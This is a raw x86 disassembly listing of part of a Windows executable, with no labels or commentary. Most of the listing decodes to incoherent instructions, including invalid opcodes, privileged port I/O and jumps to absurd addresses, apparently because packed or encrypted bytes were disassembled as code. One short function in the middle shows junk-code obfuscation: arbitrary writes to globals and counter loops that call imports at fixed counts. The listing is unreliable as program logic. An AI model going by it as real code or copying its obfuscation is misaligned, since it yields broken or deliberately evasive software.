  40d363:	stc    
  40d364:	add    ecx,ebx
  40d366:	test   DWORD PTR [eax],edx
  40d368:	js     0x40d397
  40d36a:	daa    
  40d36b:	add    al,0x4a
  40d36d:	adc    BYTE PTR ds:0x905c39fd,bl
  40d373:	jle    0x40d31d
  40d375:	mov    BYTE PTR [esi+0x35],bh
  40d378:	dec    eax
  40d379:	stos   DWORD PTR es:[edi],eax
  40d37a:	or     eax,0xe6ea4117
  40d37f:	stc    
  40d380:	sahf   
  40d381:	or     al,0xda
  40d383:	adc    dl,BYTE PTR [eax-0x25]
  40d386:	or     al,0x96
  40d388:	sbb    DWORD PTR [esi-0x7b214165],0x9b9e20a5
  40d392:	sbb    esi,DWORD PTR [edi]
  40d394:	mov    cl,ah
  40d396:	in     eax,dx
  40d397:	jnp    0x40d38a
  40d399:	std    
  40d39a:	jmp    0xe45bbb76
  40d39f:	mov    ebx,0x169ff46a
  40d3a4:	mov    bl,0x15
  40d3a6:	imul   eax,DWORD PTR [ecx+edi*4-0x3c],0xffffffe5
  40d3ab:	add    BYTE PTR [ecx-0x3e],dh
  40d3ae:	adc    DWORD PTR [ecx+esi*4],ebp
  40d3b1:	and    al,0x66
  40d3b3:	cmp    ebx,0xaa302cf4
  40d3b9:	adc    BYTE PTR [edx+0x3202af3b],bl
  40d3bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3c0:	arpl   WORD PTR [eax+0x53],bp
  40d3c3:	ret    0x763c
  40d3c6:	add    eax,0xffffffcf
  40d3c9:	jmp    0x1401:0xac266ec8
  40d3d0:	in     eax,0xba
  40d3d2:	stos   DWORD PTR es:[edi],eax
  40d3d3:	pop    ebx
  40d3d4:	mov    esi,0xa33885a4
  40d3d9:	cdq    
  40d3da:	dec    esi
  40d3db:	jmp    0x2ac24507
  40d3e0:	aaa    
  40d3e1:	add    ebp,DWORD PTR [eax-0xe339e9]
  40d3e7:	mov    ds:0xd15b6808,al
  40d3ec:	adc    DWORD PTR [edx],edi
  40d3ee:	cmp    eax,0xbcc2e716
  40d3f3:	call   FWORD PTR [ecx+0x70]
  40d3f6:	mov    cl,0xc5
  40d3f8:	adc    BYTE PTR cs:[eax+0x5cc2ce33],ah
  40d3ff:	jmp    0x40d3b0
  40d401:	sub    BYTE PTR [eax],ch
  40d403:	sbb    BYTE PTR [ebp+0xb559057],0x9f
  40d40a:	les    edx,FWORD PTR [ebx]
  40d40c:	sbb    al,0x39
  40d40e:	out    0xa2,eax
  40d410:	loope  0x40d434
  40d412:	cs add al,bh
  40d415:	test   eax,0x83110b99
  40d41a:	add    edx,DWORD PTR [edx]
  40d41c:	fld    QWORD PTR ds:0x7ea5b31
  40d422:	pop    ss
  40d423:	sahf   
  40d424:	jg     0x40d3bd
  40d426:	int3   
  40d427:	lahf   
  40d428:	mov    dh,0xb7
  40d42a:	outs   dx,DWORD PTR ds:[esi]
  40d42b:	test   BYTE PTR [ebp-0x272c7c24],dh
  40d431:	das    
  40d432:	imul   edi,eax,0xffffff9f
  40d435:	dec    esp
  40d436:	and    DWORD PTR [ebx+0x3b],0x46
  40d43a:	inc    ebp
  40d43b:	out    dx,eax
  40d43c:	enter  0x2eaa,0xf1
  40d440:	cs out dx,al
  40d442:	test   eax,0x9d14200a
  40d447:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d448:	pop    edx
  40d449:	aad    0xdc
  40d44b:	test   al,0x1a
  40d44d:	int    0xd6
  40d44f:	scas   al,BYTE PTR es:[edi]
  40d450:	push   ss
  40d451:	repnz mov eax,0xf5c0aa1b
  40d457:	lock lods al,BYTE PTR ds:[esi]
  40d459:	sbb    al,0xe5
  40d45b:	and    BYTE PTR [eax+0x56],0x46
  40d45f:	inc    eax
  40d460:	xchg   esp,eax
  40d461:	fwait
  40d462:	mov    WORD PTR [eax-0x683a489],gs
  40d468:	or     ecx,DWORD PTR [edx]
  40d46a:	scas   eax,DWORD PTR es:[edi]
  40d46b:	iret   
  40d46c:	dec    ebp
  40d46d:	ss inc eax
  40d46f:	test   eax,0xf0fbda49
  40d474:	imul   ebx,DWORD PTR [ecx+0x2b09faa5],0x6f830b05
  40d47e:	mov    gs,WORD PTR [eax+0x70]
  40d481:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d482:	dec    eax
  40d483:	or     DWORD PTR [ebx-0x447ea232],edi
  40d489:	(bad)  
  40d48a:	and    BYTE PTR [edi+0x15d599bc],bl
  40d490:	daa    
  40d491:	test   al,0xfa
  40d493:	daa    
  40d494:	cmc    
  40d495:	shl    BYTE PTR [esi],cl
  40d497:	cs inc edx
  40d499:	push   cs
  40d49a:	or     DWORD PTR [ecx+0x67aac3f9],0xafd45c3c
  40d4a4:	call   0xdd3d:0x97c6eaad
  40d4ab:	cli    
  40d4ac:	adc    eax,0xb459a49a
  40d4b1:	jb     0x40d4e5
  40d4b3:	add    eax,DWORD PTR [ecx+eax*4-0x14]
  40d4b7:	out    dx,al
  40d4b8:	dec    eax
  40d4b9:	sahf   
  40d4ba:	sahf   
  40d4bb:	cdq    
  40d4bc:	lock pop edx
  40d4be:	outs   dx,DWORD PTR ds:[esi]
  40d4bf:	jmp    0x40d46e
  40d4c1:	xor    al,0xd1
  40d4c3:	sbb    eax,0xcf890129
  40d4c8:	aaa    
  40d4c9:	pop    eax
  40d4ca:	pop    ebx
  40d4cb:	or     edx,DWORD PTR [ebx-0x4f]
  40d4ce:	cwde   
  40d4cf:	or     BYTE PTR [ebp+ecx*4-0x55],bl
  40d4d3:	adc    al,0x60
  40d4d5:	in     al,dx
  40d4d6:	cdq    
  40d4d7:	out    0x18,eax
  40d4d9:	jmp    0x40d4eb
  40d4db:	cdq    
  40d4dc:	mov    eax,ds:0xb1c145e9
  40d4e1:	adc    edx,ebx
  40d4e3:	cmp    ch,BYTE PTR [edi]
  40d4e5:	xor    BYTE PTR [ecx-0x76f750bc],bh
  40d4eb:	inc    eax
  40d4ec:	out    dx,al
  40d4ed:	faddp  st(0),st
  40d4ef:	in     eax,dx
  40d4f0:	jmp    0x519f:0x35aa680c
  40d4f7:	rol    WORD PTR [eax+0x2dde1f91],0x5e
  40d4ff:	pop    ebp
  40d500:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d501:	pop    edx
  40d502:	cmp    edx,DWORD PTR [edi+0x53aff2ef]
  40d508:	or     al,0x59
  40d50a:	outs   dx,BYTE PTR ds:[esi]
  40d50b:	out    0x2e,al
  40d50d:	retf   
  40d50e:	aam    0x59
  40d510:	add    al,0xc8
  40d512:	mov    ebx,esi
  40d514:	or     al,0xed
  40d516:	push   ebx
  40d517:	cmp    esi,ebx
  40d519:	fbld   TBYTE PTR [esi+ecx*1]
  40d51c:	cmp    al,0x2c
  40d51e:	pusha  
  40d51f:	adc    edx,eax
  40d521:	and    ebx,ecx
  40d523:	inc    edx
  40d524:	inc    edx
  40d525:	in     eax,dx
  40d526:	jnp    0x40d4db
  40d528:	adc    DWORD PTR [ebx+0x4e],edx
  40d52b:	addr16 inc ecx
  40d52d:	repz xor al,0xb
  40d530:	mov    ecx,DWORD PTR [edi]
  40d532:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d533:	dec    edx
  40d534:	jecxz  0x40d591
  40d536:	int    0x62
  40d538:	fld    QWORD PTR [edi-0x72]
  40d53b:	cmp    eax,0x3ed18ad4
  40d540:	sbb    BYTE PTR ds:0x3f540d5c,dl
  40d546:	xchg   edi,eax
  40d547:	pop    edi
  40d548:	cli    
  40d549:	inc    ecx
  40d54a:	out    dx,al
  40d54b:	test   BYTE PTR [edx+0x24f09b30],0x59
  40d552:	inc    esi
  40d553:	cmp    DWORD PTR [esi-0x6b6ff12f],0x1ec06edb
  40d55d:	xlat   BYTE PTR ds:[ebx]
  40d55e:	cmp    ebx,DWORD PTR [esi+esi*4-0x2606aad1]
  40d565:	mov    ch,0x6e
  40d567:	pop    es
  40d568:	jo     0x40d59e
  40d56a:	mov    ebx,0xfb47db14
  40d56f:	sub    BYTE PTR [eax+edx*4+0x6de0e757],bh
  40d576:	pop    ss
  40d577:	imul   ebp,DWORD PTR [ebp+ecx*2-0x38],0xffffff91
  40d57c:	out    0x8d,al
  40d57e:	pop    edx
  40d57f:	pop    es
  40d580:	inc    ecx
  40d581:	je     0x40d54f
  40d583:	ficom  DWORD PTR [esi]
  40d585:	fnsave [esi]
  40d587:	pop    ds
  40d588:	test   DWORD PTR [edi+0x43],0x4b1a1c03
  40d58f:	xor    edx,edx
  40d591:	add    DWORD PTR [ebp-0xc],ebx
  40d594:	pop    ebx
  40d595:	mov    eax,DWORD PTR [ebp-0xc]
  40d598:	pop    edi
  40d599:	pop    esi
  40d59a:	pop    ebx
  40d59b:	leave  
  40d59c:	ret    0x10
  40d59f:	push   ebp
  40d5a0:	mov    ebp,esp
  40d5a2:	push   ecx
  40d5a3:	not    eax
  40d5a5:	push   ecx
  40d5a6:	mov    eax,0xf89c8532
  40d5ab:	mov    DWORD PTR ds:0x4336a3,ecx
  40d5b1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40d5b8:	mov    DWORD PTR ds:0x433697,edx
  40d5be:	push   esi
  40d5bf:	mov    DWORD PTR ds:0x43369b,0x1f1b
  40d5c9:	mov    DWORD PTR [ebp-0x8],eax
  40d5cc:	mov    DWORD PTR ds:0x4336a7,0x659
  40d5d6:	mov    ecx,DWORD PTR [ebp+0x8]
  40d5d9:	push   edi
  40d5da:	not    edi
  40d5dc:	mov    edi,0x7510854
  40d5e1:	not    DWORD PTR ds:0x4336e3
  40d5e7:	mov    esi,0x32729b
  40d5ec:	mov    DWORD PTR ds:0x43369b,0x27d6
  40d5f6:	cmp    ecx,eax
  40d5f8:	mov    DWORD PTR ds:0x433727,0x52ab
  40d602:	je     0x40d94e
  40d608:	mov    eax,DWORD PTR [ebp-0x4]
  40d60b:	mov    ecx,DWORD PTR [ebp+0xc]
  40d60e:	sub    DWORD PTR ds:0x43372f,0x32
  40d618:	xor    eax,edi
  40d61a:	add    eax,esi
  40d61c:	mov    DWORD PTR ds:0x43365b,0x51fb
  40d626:	cmp    eax,ecx
  40d628:	mov    DWORD PTR ds:0x4336db,0x5a
  40d632:	je     0x40d94e
  40d638:	and    DWORD PTR ds:0x433717,0x0
  40d642:	mov    edx,DWORD PTR ds:0x433717
  40d648:	inc    edx
  40d649:	mov    DWORD PTR ds:0x433717,edx
  40d64f:	cmp    DWORD PTR ds:0x433717,0x25
  40d656:	jne    0x40d665
  40d65c:	push   DWORD PTR [ebp-0xc]
  40d65f:	call   DWORD PTR ds:0x4122a8
  40d665:	cmp    DWORD PTR ds:0x433717,0x18
  40d66c:	jb     0x40d642
  40d672:	and    DWORD PTR ds:0x433663,0x0
  40d67c:	xor    edx,edx
  40d67e:	add    edx,DWORD PTR ds:0x433663
  40d684:	inc    edx
  40d685:	mov    DWORD PTR ds:0x433663,edx
  40d68b:	cmp    DWORD PTR ds:0x433663,0x1c
  40d692:	jne    0x40d6a3
  40d698:	push   0x433753
  40d69d:	call   DWORD PTR ds:0x412360
  40d6a3:	cmp    DWORD PTR ds:0x433663,0x1b
  40d6aa:	jb     0x40d67c
  40d6b0:	movzx  eax,BYTE PTR ds:0x433667
  40d6b7:	add    eax,DWORD PTR ds:0x43369b
  40d6bd:	mov    ds:0x433667,eax
  40d6c2:	mov    eax,DWORD PTR [ebp-0x4]
  40d6c5:	xor    eax,edi
  40d6c7:	add    eax,esi
  40d6c9:	push   eax
  40d6ca:	push   DWORD PTR [ebp-0x8]
  40d6cd:	push   DWORD PTR [ebp-0x4]
  40d6d0:	mov    edx,DWORD PTR ds:0x413b34
  40d6d6:	call   0x4057b9
  40d6db:	mov    ecx,DWORD PTR ds:0x413b34
  40d6e1:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40d6e7:	jmp    0x40d944
  40d6ec:	mov    esi,0x704a1816
  40d6f1:	jo     0x40d75f
  40d6f3:	adc    al,BYTE PTR ds:0x76a0482a
  40d6f9:	push   ebx
  40d6fa:	test   BYTE PTR [edx+edi*2+0x3e7e7e92],cl
  40d701:	jl     0x40d781
  40d703:	jle    0x40d6e2
  40d705:	lods   al,BYTE PTR ds:[esi]
  40d706:	inc    esi
  40d707:	pop    edi
  40d708:	dec    esp
  40d709:	ds mov bl,0xb
  40d70c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d70d:	mov    al,0xb3
  40d70f:	cld    
  40d710:	test   al,0x15
  40d712:	add    ebp,DWORD PTR [esi-0x66]
  40d715:	inc    esi
  40d716:	test   DWORD PTR [ebp-0x47],edx
  40d719:	sbb    eax,0x9870bfd6
  40d71e:	adc    al,0x83
  40d720:	sbb    bl,ch
  40d722:	xchg   edx,eax
  40d723:	scas   al,BYTE PTR es:[edi]
  40d724:	mov    cl,0x25
  40d726:	adc    DWORD PTR [eax-0x68],eax
  40d729:	cmp    dh,bl
  40d72b:	jo     0x40d727
  40d72d:	mov    bl,0x96
  40d72f:	fdivr  st,st(1)
  40d731:	fwait
  40d732:	push   0x74715994
  40d737:	mov    ebx,0x9b5a25df
  40d73c:	fisubr WORD PTR [ecx-0x5251afd6]
  40d742:	shr    ebp,0xc0
  40d745:	aas    
  40d746:	and    DWORD PTR [esi],0xffffffcc
  40d749:	es rcl eax,cl
  40d74c:	mov    esp,0xb377df4f
  40d751:	sar    BYTE PTR [eax-0x459c7473],cl
  40d757:	add    ch,BYTE PTR [esi-0x24]
  40d75a:	pop    ebx
  40d75b:	push   esp
  40d75c:	cmp    al,0x4d
  40d75e:	or     DWORD PTR [edx],esi
  40d760:	mov    BYTE PTR [edi+0x48],ah
  40d763:	mov    eax,0xc8cc44cf
  40d768:	(bad)
  40d76b:	dec    eax
  40d76c:	lods   eax,DWORD PTR ds:[esi]
  40d76d:	add    esi,DWORD PTR fs:0x76ea984d
  40d774:	push   edx
  40d775:	in     eax,0xf4
  40d777:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d778:	add    dh,dl
  40d77a:	ins    DWORD PTR es:[edi],dx
  40d77b:	stc    
  40d77c:	in     al,dx
  40d77d:	fsub   QWORD PTR [eax]
  40d77f:	dec    edx
  40d780:	adc    edi,DWORD PTR [ebx]
  40d782:	(bad)  
  40d783:	and    ah,ah
  40d785:	mov    esp,gs
  40d787:	or     al,0x81
  40d789:	or     BYTE PTR [edi-0x3f],dh
  40d78c:	cmc    
  40d78d:	and    eax,0x23a9432f
  40d792:	mov    al,ds:0xbf85eefb
  40d797:	xor    eax,0x915a72d5
  40d79c:	push   edi
  40d79d:	js     0x40d726
  40d79f:	(bad)  
  40d7a0:	leave  
  40d7a1:	les    edi,FWORD PTR [eax-0x51]
  40d7a4:	ret    0xb33
  40d7a7:	leave  
  40d7a8:	dec    esi
  40d7a9:	(bad)  
  40d7aa:	out    dx,al
  40d7ab:	inc    ebx
  40d7ac:	or     ebp,0x58807007
  40d7b2:	loop   0x40d81c
  40d7b4:	sub    BYTE PTR [ecx+0x11],bh
  40d7b7:	xchg   esp,eax
  40d7b8:	clc    
  40d7b9:	icebp  
  40d7ba:	jo     0x40d77f
  40d7bc:	sbb    BYTE PTR [edx],ah
  40d7be:	add    esp,DWORD PTR [edx-0x635cceda]
  40d7c4:	xchg   edi,eax
  40d7c5:	arpl   WORD PTR [ebx],di
  40d7c7:	adc    al,0x18
  40d7c9:	mov    esp,0x60c939cb
  40d7ce:	loopne 0x40d80c
  40d7d0:	mov    eax,ds:0x250e09ba
  40d7d5:	jle    0x40d7b4
  40d7d7:	push   ebp
  40d7d8:	xchg   ecx,eax
  40d7d9:	push   ebx
  40d7da:	mov    esp,0x852234de
  40d7df:	mov    ebp,0xd55b2f99
  40d7e4:	xor    ebp,ebp
  40d7e6:	sub    DWORD PTR [ebp-0x43],ebp
  40d7e9:	arpl   WORD PTR [edx+0x68],dx
  40d7ec:	shr    bh,1
  40d7ee:	xchg   ecx,eax
  40d7ef:	and    BYTE PTR [edi+ebx*8+0x29d6796],cl
  40d7f6:	repnz xor BYTE PTR [ebp-0x67786ba5],ah
  40d7fd:	dec    BYTE PTR [edx+0x11]
  40d800:	cli    
  40d801:	out    0xf,eax
  40d803:	sar    BYTE PTR [edi+0x1c],0xde
  40d807:	das    
  40d808:	and    BYTE PTR [edx-0x63],0x65
  40d80c:	test   BYTE PTR [esi-0x5e],bh
  40d80f:	inc    ebp
  40d810:	sbb    BYTE PTR cs:0xd2842d7a,dh
  40d817:	mov    esi,0x95610294
  40d81c:	cmp    ebx,edx
  40d81e:	xchg   ecx,eax
  40d81f:	shl    BYTE PTR [edx+0x5c4a3c02],1
  40d825:	jae    0x40d7c3
  40d827:	mov    DWORD PTR [ecx-0x58e6a204],esi
  40d82d:	sti    
  40d82e:	add    ebx,DWORD PTR [esi]
  40d830:	mov    al,fs:0xe1296e8a
  40d836:	xchg   esp,eax
  40d837:	loope  0x40d7cb
  40d839:	push   eax
  40d83a:	inc    ebp
  40d83b:	int3   
  40d83c:	jecxz  0x40d8b3
  40d83e:	icebp  
  40d83f:	scas   al,BYTE PTR es:[edi]
  40d840:	pusha  
  40d841:	mov    edx,0x85c5d2f2
  40d846:	ins    DWORD PTR es:[edi],dx
  40d847:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d848:	repz (bad) 
  40d84c:	sar    DWORD PTR [ebx],0x85
  40d84f:	mov    dh,0xd4
  40d851:	in     al,dx
  40d852:	inc    esi
  40d853:	mov    ds:0x41566de4,eax
  40d858:	cmp    BYTE PTR [edi-0x7a],ch
  40d85b:	or     BYTE PTR [ebx-0x1f],ch
  40d85e:	or     al,0x68
  40d860:	xchg   ecx,eax
  40d861:	sbb    eax,0x575aae6c
  40d866:	mov    edx,0x664085e4
  40d86b:	sbb    ebp,DWORD PTR [edx]
  40d86d:	jge    0x40d885
  40d86f:	std    
  40d870:	add    BYTE PTR es:[ecx+0x63],0x71
  40d875:	jno    0x40d7fc
  40d877:	push   ss
  40d878:	das    
  40d879:	sbb    BYTE PTR [edx-0x7f],ah
  40d87c:	and    ch,BYTE PTR [ebx-0x781217bf]
  40d882:	or     bl,BYTE PTR [eax]
  40d884:	loope  0x40d89d
  40d886:	ja     0x40d8f9
  40d888:	fld    TBYTE PTR [ebp+0x4c]
  40d88b:	mov    eax,ds:0xdf4ef161
  40d890:	outs   dx,DWORD PTR ds:[esi]
  40d891:	jae    0x40d84e
  40d893:	call   0xc8fb:0x8cf52fb
  40d89a:	mov    ds:0x7497379c,eax
  40d89f:	inc    edi
  40d8a0:	mov    ds:0x849a06f6,al
  40d8a5:	mov    bl,0xbe
  40d8a7:	xlat   BYTE PTR ds:[ebx]
  40d8a8:	and    DWORD PTR [ecx-0x6d8dc8a6],0x4df53248
  40d8b2:	jg     0x40d88f
  40d8b4:	xchg   esp,eax
  40d8b5:	and    cl,bh
  40d8b7:	es xchg edx,eax
  40d8b9:	sbb    al,0x9
  40d8bb:	pop    eax
  40d8bc:	sub    BYTE PTR [eax+esi*8],cl
  40d8bf:	mov    ds:0x5a23c455,eax
  40d8c4:	lods   al,BYTE PTR ds:[esi]
  40d8c5:	or     bl,ah
  40d8c7:	mov    ah,0x53
  40d8c9:	cld    
  40d8ca:	sbb    BYTE PTR [esi-0x2d],0xb0
  40d8ce:	inc    ecx
  40d8cf:	sub    bl,BYTE PTR [ecx+0x28]
  40d8d2:	inc    edi
  40d8d3:	adc    eax,esp
  40d8d5:	es icebp 
  40d8d7:	cmc    
  40d8d8:	inc    ecx
  40d8d9:	jecxz  0x40d8e9
  40d8db:	mov    dh,0x7c
  40d8dd:	dec    edi
  40d8de:	(bad)  
  40d8df:	out    dx,al
  40d8e0:	xchg   bh,al
  40d8e2:	cmp    WORD PTR [esi+0x69],cx
  40d8e6:	dec    ebp
  40d8e7:	push   ebp
  40d8e8:	repnz sbb WORD PTR [edx-0x64],bx
  40d8ed:	in     al,0xc4
  40d8ef:	cmp    ah,0x51
  40d8f2:	push   0x88c9f5d7
  40d8f7:	jno    0x40d8e7
  40d8f9:	mov    edx,0x5ac65fa3
  40d8fe:	mov    edi,0xf23af789
  40d903:	push   0x176fc9c8
  40d908:	out    0xea,al
  40d90a:	push   ebp
  40d90b:	xchg   BYTE PTR [esi+edi*1-0x561fe20b],al
  40d912:	add    ecx,esi
  40d914:	pop    es
  40d915:	pop    esp
  40d916:	mov    eax,0x6ce20004
  40d91b:	(bad)  
  40d91c:	push   esi
  40d91d:	imul   eax,DWORD PTR [ebp-0x72c44dd2],0xffffffd6
  40d924:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d925:	xchg   edx,eax
  40d926:	(bad)  
  40d928:	call   0x1a47:0xa0647f5b
  40d92f:	shr    eax,0xd1
  40d932:	lods   al,BYTE PTR ds:[esi]
  40d933:	rcr    DWORD PTR [edi+edi*8+0x4e943000],cl
  40d93a:	adc    al,0xf5
  40d93c:	xor    eax,0xa8d13960
  40d941:	push   eax
  40d942:	xor    DWORD PTR [ebx],eax
  40d944:	mov    DWORD PTR [ecx],eax
  40d946:	mov    eax,DWORD PTR [ebp-0x8]
  40d949:	jmp    0x40de40
  40d94e:	mov    eax,DWORD PTR [ebp-0x4]
  40d951:	mov    ecx,DWORD PTR [ebp+0x10]
  40d954:	xor    eax,edi
  40d956:	add    eax,esi
  40d958:	jmp    0x40dbb5
  40d95d:	or     DWORD PTR [ebx+0x1f],0x4172f5e2
  40d964:	imul   ebx,DWORD PTR [ecx],0xd02b51ed
  40d96a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d96b:	cdq    
  40d96c:	push   ecx
  40d96d:	cmp    dl,BYTE PTR [eax+0x7c3e7e7e]
  40d973:	jle    0x40d9f3
  40d975:	sahf   
  40d976:	into   
  40d977:	push   ebp
  40d978:	mov    cl,0x9e
  40d97a:	mov    ebx,0x4b686563
  40d97f:	call   0x9f61a590
  40d984:	and    al,0x41
  40d986:	nop    ebx
  40d989:	jmp    0x5ec37c3a
  40d98e:	pushf  
  40d98f:	push   0x3eec246
  40d994:	dec    edi
  40d995:	jmp    0x40d9ec
  40d997:	lahf   
  40d998:	aad    0x9b
  40d99a:	cdq    
  40d99b:	leave  
  40d99c:	stos   DWORD PTR es:[edi],eax
  40d99d:	sti    
  40d99e:	mov    ds:0x9b8a41e9,al
  40d9a3:	idiv   DWORD PTR [ecx]
  40d9a5:	sti    
  40d9a6:	xor    ebp,DWORD PTR [esi+0x23]
  40d9a9:	jmp    0x211bb2c5
  40d9ae:	add    al,dl
  40d9b0:	iret   
  40d9b1:	inc    edx
  40d9b2:	xor    al,0xdd
  40d9b4:	sub    al,bl
  40d9b6:	cmp    eax,DWORD PTR [ebx-0x241a522e]
  40d9bc:	outs   dx,BYTE PTR gs:[esi]
  40d9be:	sahf   
  40d9bf:	(bad)  
  40d9c0:	mov    ebp,0xbb15f5ea
  40d9c5:	mov    esp,0x5c931be4
  40d9ca:	cmp    dl,BYTE PTR [ebp+0x4f]
  40d9cd:	lds    esi,FWORD PTR [ecx-0x29a34942]
  40d9d3:	data16 mov ah,0x1b
  40d9d6:	push   es
  40d9d7:	jbe    0x40d9d7
  40d9d9:	hlt    
  40d9da:	hlt    
  40d9db:	jb     0x40da46
  40d9dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d9de:	ret    0x9b3b
  40d9e1:	jnp    0x40d9a4
  40d9e3:	mov    es,WORD PTR [bx+0x46]
  40d9e7:	adc    ecx,edi
  40d9e9:	ja     0x40d9f7
  40d9eb:	sub    bh,BYTE PTR [ebx+ebp*2-0x23]
  40d9ef:	pop    ds
  40d9f0:	stos   BYTE PTR es:[edi],al
  40d9f1:	in     eax,dx
  40d9f2:	inc    edx
  40d9f3:	mov    ds:0x1807d74c,eax
  40d9f8:	pop    esp
  40d9f9:	int    0x4d
  40d9fb:	pop    esi
  40d9fc:	inc    ecx
  40d9fd:	imul   DWORD PTR [edi+0x17]
  40da00:	sbb    esi,DWORD PTR [esi-0x4e]
  40da03:	xchg   ebx,eax
  40da04:	shl    DWORD PTR [edi+0x6680ed67],1
  40da0a:	scas   eax,DWORD PTR es:[edi]
  40da0b:	adc    al,0x6b
  40da0d:	mov    dl,0x1
  40da0f:	push   ecx
  40da10:	jns    0x40da16
  40da12:	xchg   BYTE PTR [ecx-0x1e],bh
  40da15:	pop    eax
  40da16:	test   al,0xaa
  40da18:	xchg   esp,eax
  40da19:	push   edx
  40da1a:	jp     0x40da4a
  40da1c:	pop    ss
  40da1d:	mov    ch,0x21
  40da1f:	adc    edx,DWORD PTR [ebx]
  40da21:	ret    
  40da22:	out    0xb4,eax
  40da24:	sbb    BYTE PTR [esi],bh
  40da26:	mov    cl,0x66
  40da28:	xchg   esi,eax
  40da29:	loopne 0x40daa2
  40da2b:	push   esp
  40da2c:	mov    eax,ds:0xdf61bb5d
  40da31:	(bad)  
  40da32:	push   edi
  40da33:	adc    esi,DWORD PTR [ebx-0x72ad79e]
  40da39:	mov    edi,0x599749a3
  40da3e:	sub    BYTE PTR [ecx+0x1805185],dl
  40da44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da45:	mov    dl,0x11
  40da48:	nop
  40da49:	jo     0x40da89
  40da4b:	les    ecx,FWORD PTR [esi+0x46]
  40da4e:	inc    ecx
  40da4f:	pop    ebp
  40da50:	sub    dx,WORD PTR [esi]
  40da53:	cmp    cl,BYTE PTR [edx]
  40da55:	add    al,0x1d
  40da57:	push   cs
  40da58:	xlat   BYTE PTR ds:[ebx]
  40da59:	and    eax,0x418683f8
  40da5e:	or     eax,0x974f086a
  40da63:	dec    esp
  40da64:	xchg   edi,eax
  40da65:	cmc    
  40da66:	inc    ebx
  40da67:	or     eax,0xb413f4c
  40da6c:	ret    0xdd86
  40da6f:	jg     0x40daab
  40da71:	jbe    0x40da7c
  40da73:	mov    bl,0x58
  40da75:	fs xchg ecx,eax
  40da77:	retf   
  40da78:	loope  0x40dae7
  40da7a:	nop
  40da7b:	jns    0x40da16
  40da7d:	cmp    BYTE PTR [ecx],al
  40da7f:	pop    eax
  40da80:	cmc    
  40da81:	sbb    DWORD PTR [ebx+ebp*1-0x78],edi
  40da85:	jae    0x40dad7
  40da87:	clc    
  40da88:	clc    
  40da89:	imul   edi,DWORD PTR [ecx],0xffffffa1
  40da8c:	mov    bl,0x5b
  40da8e:	pop    ebx
  40da8f:	push   0x3a
  40da91:	jg     0x40dae7
  40da93:	pop    ds
  40da94:	shl    ch,0x80
  40da97:	xor    eax,0x2f4128a
  40da9c:	sub    al,0xd8
  40da9f:	jg     0x40dab5
  40daa1:	and    bh,bl
  40daa3:	dec    ebp
  40daa4:	inc    eax
  40daa5:	xchg   esi,eax
  40daa6:	and    DWORD PTR [ebx-0x5d],eax
  40daa9:	fs pop esp
  40daab:	mov    BYTE PTR [edx],bl
  40daad:	sar    DWORD PTR [ebx-0x2fa3df8a],0xb9
  40dab4:	mov    BYTE PTR [eax+eiz*1-0x3f],ch
  40dab8:	inc    ebx
  40dab9:	push   ecx
  40daba:	adc    BYTE PTR [ebp+0x60],0xc8
  40dabe:	push   edi
  40dabf:	lods   eax,DWORD PTR ds:[esi]
  40dac0:	fstp   DWORD PTR [esi]
  40dac2:	xlat   BYTE PTR ds:[ebx]
  40dac3:	iret   
  40dac4:	jns    0x40daa0
  40dac6:	and    BYTE PTR [esi],bh
  40dac8:	loopne 0x40db3c
  40daca:	lds    edx,FWORD PTR [edx-0x75fdce43]
  40dad0:	mov    ecx,0x85893c9
  40dad5:	mov    dl,0xdc
  40dad7:	(bad)  
  40dad8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dad9:	ficom  DWORD PTR [edx-0x429181af]
  40dadf:	dec    eax
  40dae0:	repnz iret 
  40dae2:	mov    dl,0xaa
  40dae4:	pop    edi
  40dae5:	adc    ch,BYTE PTR [ebp+0x13]
  40dae8:	popa   
  40dae9:	sbb    ecx,DWORD PTR [esi+ecx*2+0x727dc1ee]
  40daf0:	pop    esi
  40daf1:	sbb    ecx,DWORD PTR [esi+edx*4+0x43f82459]
  40daf8:	mov    DWORD PTR [ecx-0x271475c3],ecx
  40dafe:	retf   0x7389
  40db01:	ja     0x40dac4
  40db03:	push   esi
  40db04:	test   DWORD PTR [ecx],edi
  40db06:	xor    al,0xd8
  40db08:	and    bl,BYTE PTR [ecx-0x6d]
  40db0b:	ds hlt 
  40db0d:	fadd   QWORD PTR [edx+edi*8+0x5b]
  40db11:	in     eax,dx
  40db12:	adc    eax,0xf38fd5cb
  40db17:	stc    
  40db18:	jecxz  0x40db59
  40db1a:	loopne 0x40db8b
  40db1c:	out    dx,eax
  40db1d:	inc    ebx
  40db1e:	and    cl,dl
  40db20:	fstp   QWORD PTR [edi+edi*4+0x4b]
  40db24:	dec    edi
  40db25:	pushf  
  40db26:	add    eax,0xadab8553
  40db2b:	adc    eax,0xb7588f3f
  40db30:	pop    ebp
  40db31:	mov    eax,0x87df4b44
  40db36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db37:	xchg   edx,eax
  40db38:	pop    ebx
  40db39:	ror    BYTE PTR [ecx-0x7],1
  40db3c:	and    eax,DWORD PTR fs:[esi+0x24]
  40db40:	mov    ds:0x35fd615a,eax
  40db45:	mov    al,0x98
  40db47:	test   ebx,edx
  40db49:	add    al,0xe9
  40db4b:	xor    DWORD PTR [ebx],esp
  40db4d:	in     al,dx
  40db4e:	sahf   
  40db4f:	sbb    ecx,DWORD PTR [esi+0x61]
  40db52:	and    edi,ecx
  40db54:	mov    ecx,0x6d7ce281
  40db59:	std    
  40db5a:	pop    ebp
  40db5b:	xchg   esi,eax
  40db5c:	jae    0x40db76
